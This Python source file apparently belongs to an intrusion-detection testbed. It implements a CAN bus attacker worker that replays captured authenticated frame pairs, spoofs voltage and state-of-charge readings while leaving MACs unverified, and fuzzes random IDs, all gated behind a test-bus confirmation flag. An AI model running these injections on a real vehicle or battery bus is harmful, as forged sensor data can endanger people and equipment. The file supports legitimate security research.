"""Keyless CAN-only worker on Pi3, controlled over its stdin.

No SSH clients, SecOC key input, authentication or reference receiver are used.
Replay copies a raw/auth pair observed on this bus without verifying its MAC.
The physical profile copies a complete observed measurement message instead.
"""
import argparse
import errno
import json
import os
import random
import select
import signal
import time

from security.attacks.attack_simulator import build_frame, validate
from security.experiments.can_capture import CaptureSocket, frame_json
from security.experiments.trial_observer import healthy
from security.physical_transport import Assembler
from security.can_diagnostic import valid_body

# Public ICD IDs, not keys. Isolated classification avoids valid control IDs.
SESSION_IDS=frozenset((0x100,0x101,0x102,0x103,0x104,0x105,0x200,0x300,0x301,0x302,0x303))


class Control:
    def __init__(self, fd=0):
        self.fd, self.pending = fd, b''

    def poll(self):
        if select.select([self.fd], [], [], 0)[0]:
            data = os.read(self.fd, 4096)
            if not data:raise EOFError('controller disconnected')
            self.pending += data
            if len(self.pending)>8192:raise ValueError('command too long')
        if b'\n' not in self.pending:return None
        line, self.pending = self.pending.split(b'\n', 1)
        return json.loads(line)


def emit(row):
    print(json.dumps(row), flush=True)


def replay_pair(records, require_auth):
    raw = None
    pair = None
    for frame in records:
        if frame.can_id == 0x100:raw = frame
        elif require_auth and pair is None and frame.can_id == 0x102 and raw is not None and 0 <= frame.t-raw.t <= .1:
            pair = [(raw.can_id, raw.data), (frame.can_id, frame.data)]
    # Consume the whole observation window so late errors/disconnects are not
    # hidden by finding a pair early. Retain only the first pair and latest raw.
    if pair is not None:return pair
    if not require_auth and raw is not None:return [(raw.can_id, raw.data)]
    raise RuntimeError('no observed replay pair in quiet baseline')


def physical_source(records, protected):
    assembler = Assembler(protected)
    source = None
    for frame in records:
        message = assembler.observe(frame)
        if source is None and message is not None and message.kind == 9 and valid_body(0x302, 9, message.body):
            source = list(message.frames)
    if source is None:
        raise RuntimeError('no complete physical message observed in quiet baseline')
    return source


def injection_frames(attack, rng, sent, pair, profile):
    if profile == 'isolated-physical-v1':
        if attack == 'replay':
            return pair
        if attack == 'spoofing':
            # Alter only the measured voltage in an observed complete message.
            # The recorded authentication tag remains untouched and unverified.
            frames = [(cid, bytearray(data)) for cid, data in pair]
            offset = (22 if frames[0][1][0] == 0xd1 else 0) + 40
            for index, byte in enumerate((4200000).to_bytes(4, 'big')):
                position = offset + index
                frames[position // 4][1][4 + position % 4] = byte
            if all(bytes(data) == original[1] for (_, data), original in zip(frames, pair)):
                position = offset + 3
                frames[position // 4][1][4 + position % 4] ^= 1
            return [(cid, bytes(data)) for cid, data in frames]
        profile = 'isolated-session-v1'
    if profile in ('isolated-v1','isolated-session-v1'):
        if attack == 'replay':
            return pair  # Send raw/auth together; never stretch them beyond pending timeout.
        if attack == 'fuzzy':
            cid = rng.randrange(0x800)
            reserved=SESSION_IDS if profile=='isolated-session-v1' else (0x100,0x101,0x102,0x103,0x200)
            while cid in reserved:
                cid = rng.randrange(0x800)
            return [(cid, bytes(rng.getrandbits(8) for _ in range(8)))]
        if attack == 'spoofing':
            cid, data = build_frame(attack, rng, sent)
            return [(cid, bytes([201]) + data[1:])]  # Explicit out-of-range SOC, keyless.
    return [pair[sent % len(pair)] if pair else build_frame(attack, rng, sent)]


def inject(bus, request, control, deadline, acknowledged):
    attack, rate, duration = request['attack'], float(request['rate']), float(request['duration'])
    error = validate(attack, request['interface'], rate, duration, acknowledged)
    if error:raise ValueError(error)
    profile = request.get('profile', 'mixed-v1')
    if profile not in ('mixed-v1', 'isolated-v1','isolated-session-v1','isolated-physical-v1'):raise ValueError('unknown attack profile')
    trial = request['trial']
    rng = random.Random(request['seed'])
    physical = profile == 'isolated-physical-v1'
    if attack == 'replay' or (physical and attack == 'spoofing'):
        def observed_frames():
            until = min(deadline, time.monotonic()+(2.5 if physical else 1))
            while time.monotonic()<until:
                if control.poll() is not None:raise ValueError('unexpected command during replay capture')
                value=bus.receive(.01)
                if value:
                    frame, own=value
                    if frame.error:raise RuntimeError('CAN error frame')
                    if not own:yield frame
        pair=(physical_source if physical else replay_pair)(observed_frames(), request['secoc'])
        emit({'result':'REPLAY_SOURCE' if attack == 'replay' else 'SPOOF_SOURCE','trial':trial,'frames':[
            {'can_id':cid,'data':data.hex()} for cid,data in pair], 'authenticated':False})
    else:pair=None
    sent=errors=echoes=0
    end=min(deadline,time.monotonic()+duration)
    next_at=time.monotonic()
    while time.monotonic()<end:
        if control.poll() is not None:raise ValueError('unexpected command during injection')
        now=time.monotonic()
        if now>=next_at:
            for cid,data in injection_frames(attack,rng,sent,pair,profile):
                try:
                    bus.send(cid,data)
                    sent+=1
                    emit({'result':'TX','trial':trial,'t':time.monotonic(),'can_id':cid,'data':data.hex()})
                except OSError as error:
                    emit({'result':'TX_ERROR','trial':trial,'errno':error.errno})
                    if error.errno not in (errno.ENOBUFS,errno.EAGAIN):raise
                    errors+=1
            next_at=max(next_at+1/rate,now)
        value=bus.receive(min(.001,max(0,next_at-time.monotonic())))
        if value:
            frame,own=value
            if frame.error:raise RuntimeError('CAN error frame')
            echoes+=int(own)
            emit({'result':'ATTACK_RX','trial':trial,'own':own,**frame_json(frame)})
    emit({'result':'ATTACK_DONE','trial':trial,'sent':sent,'tx_errors':errors,'own_echo':echoes,
          'rx_dropped':bus.dropped})


def run(channel, duration, run_id, acknowledged, control=None,environment='physical'):
    healthy(channel,environment)
    bus=CaptureSocket(channel,transmit=True)
    control=control or Control()
    deadline=time.monotonic()+duration
    def stop(*_):raise EOFError('worker stopped')
    old={s:signal.signal(s,stop) for s in (signal.SIGTERM,signal.SIGINT,signal.SIGHUP)}
    try:
        from security.ids.startup_identity import source_digest, file_digest
        import platform,sys
        emit({'result':'READY','run_id':run_id,'role':'keyless-can-attacker','profiles':['mixed-v1','isolated-v1','isolated-session-v1','isolated-physical-v1'],
              'execution_identity':{'schema':'python-actor-startup-v1','source_sha256':source_digest(),
                  'interpreter':file_digest(sys.executable),'python':platform.python_version()}})
        while time.monotonic()<deadline:
            request=control.poll()
            if request is not None:
                if request.get('interface')!=channel:raise ValueError('interface mismatch')
                inject(bus,request,control,deadline,acknowledged)
            else:
                value=bus.receive(.01)
                if value and value[0].error:raise RuntimeError('CAN error frame')
    except EOFError:
        pass
    except RuntimeError as error:
        emit({'result':'ATTACKER_ERROR','run_id':run_id,'category':'clock' if 'clock mapping' in str(error) else 'runtime',
              'error':str(error)})
        raise
    finally:
        bus.close()
        for s,handler in old.items():signal.signal(s,handler)
        emit({'result':'ATTACKER_STOPPED','run_id':run_id})


def main(argv=None):
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--interface',default='can0')
    parser.add_argument('--duration',type=float,required=True)
    parser.add_argument('--run-id',required=True)
    parser.add_argument('--i-am-on-a-test-bus',action='store_true')
    parser.add_argument('--environment',choices=('physical','vcan'),default='physical')
    args=parser.parse_args(argv)
    if not 0<args.duration<=86400 or not args.i_am_on_a_test_bus:parser.error('bounded duration and isolated bus confirmation required')
    run(args.interface,args.duration,args.run_id,args.i_am_on_a_test_bus,environment=args.environment)


if __name__=='__main__':main()
